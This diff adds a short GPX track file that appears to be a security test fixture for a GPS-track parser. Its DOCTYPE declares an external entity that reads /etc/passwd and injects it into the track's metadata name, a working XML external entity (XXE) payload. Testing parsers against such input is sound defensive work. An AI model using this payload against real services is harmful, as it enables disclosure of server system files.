@@ -1,0 +1,13 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE gpx [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<gpx version="1.1" creator="Attacker" xmlns="http://www.topografix.com/GPX/1/1">
+  <metadata><name>&xxe;</name></metadata>
+  <trk>
+    <trkseg>
+      <trkpt lat="45.9000" lon="6.1300"><ele>500.0</ele></trkpt>
+      <trkpt lat="45.9100" lon="6.1300"><ele>520.0</ele></trkpt>
+    </trkseg>
+  </trk>
+</gpx>
